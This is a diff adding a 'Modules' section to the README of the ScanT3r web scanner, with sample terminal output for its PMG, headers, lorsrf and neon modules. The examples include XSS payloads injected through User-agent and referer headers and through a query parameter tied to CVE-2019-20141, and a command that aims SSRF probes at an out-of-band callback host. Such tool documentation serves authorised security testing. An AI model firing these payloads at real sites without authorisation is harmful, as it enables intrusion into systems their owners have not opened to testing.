@@ -96,3 +96,137 @@ $ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go
 $ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py --nologo
 ```
 
+
+## Modules 
+
+* **PMG**
+```bash
+┌─[knassar702@PC]─[~/tools/scant3r]
+└──╼ $cat waybackurls.txt | python3 scant3r.py -m PMG
+
++-+-+-+-+-+-+-+
+|S|C|a|N|t|3|r|
++-+-+-+-+-+-+-+
+             ____
+            / . .\
+            \  ---<
+             \  /
+   __________/ /
+-=:___________/
+
+[!] Coded by : Khaled Nassar @knassar702
+[!] Version : 0.5#Beta
+    	
+[!] timeout : 10
+[!] random-agent : False
+[!] threads : 20
+[!] module : PMG,
+[!] URLS : 3
+[!] host : None
+http://example.com/?file=index.php
+http://example.com/?api_key=
+http://example.com/?api_key=
+http://example.com/?search=
+http://example.com/?search=
+
+```
+* **headers**
+```bash
+┌─[knassar702@PC]─[~/tools/scant3r]
+└──╼ $echo https://menacoderrr.pythonanywhere.com|python3 scant3r.py -m headers
+
++-+-+-+-+-+-+-+
+|S|C|a|N|t|3|r|
++-+-+-+-+-+-+-+
+             ____
+            / . .\
+            \  ---<
+             \  /
+   __________/ /
+-=:___________/
+
+[!] Coded by : Khaled Nassar @knassar702
+[!] Version : 0.5#Beta
+    	
+[!] timeout : 10
+[!] random-agent : False
+[!] threads : 20
+[!] module : headers,
+[!] URLS : 1
+[!] host : None
+
+[!] Bug : Cross-site scripting
+[!] Header: User-agent
+[!] Payload: ">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"
+[!] Method: GET
+[!] URL: https://menacoderrr.pythonanywhere.com
+|-----------------|
+        
+
+[!] Bug : Cross-site scripting
+[!] Header: referer
+[!] Payload: ">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"
+[!] Method: GET
+[!] URL: https://menacoderrr.pythonanywhere.com
+|-----------------|
+
+```
+
+* **lorsrf**
+
+```bash
+┌─[knassar702@PC]─[~/tools/scant3r]
+└──╼ $echo 'http://yourtarget.com/' | python3 scant3r.py -m lorsrf -w 50 -R -x 'http://myhost.burpcollaborator.net'
++-+-+-+-+-+-+-+
+|S|C|a|N|t|3|r|
++-+-+-+-+-+-+-+
+             ____
+            / . .\
+            \  ---<
+             \  /
+   __________/ /
+-=:___________/
+
+[!] Coded by : Khaled Nassar @knassar702
+[!] Version : 0.5#Beta
+    	
+[!] timeout : 10
+[!] random-agent : False
+[!] threads : 20
+[!] module : lorsrf,
+[!] URLS : 3
+[!] host : None
+```
+<img src='images/call.png'>
+
+* **neon**
+```bash
+# CVE-2019-20141 - https://knassar702.github.io/cve/neon/
+┌─[knassar702@PC]─[~/tools/scant3r]
+└──╼ $echo http://$$$$$.com/admin/ | python3 scant3r.py -m neon
+
+
+   ____              __  ____
+  / __/______ ____  / /_|_  /____
+ _\ \/ __/ _ `/ _ \/ __//_ </ __/
+/___/\__/\_,_/_//_/\__/____/_/
+
+
+[!] Coded by : Khaled Nassar @knassar702
+[!] Version : 0.5#Beta
+    	
+[!] timeout : 10
+[!] random-agent : False
+[!] threads : 20
+[!] module : neon,
+[!] URLS : 1
+[!] host : None
+
+[!] Bug : Cross-site scripting
+[!] Payload: <img src=x onerror=alert(1)>
+[!] Method: GET
+[!] parameter: q
+[!] Link: q=<img src=x onerror=alert(1)>
+|-----------------|
+
+```
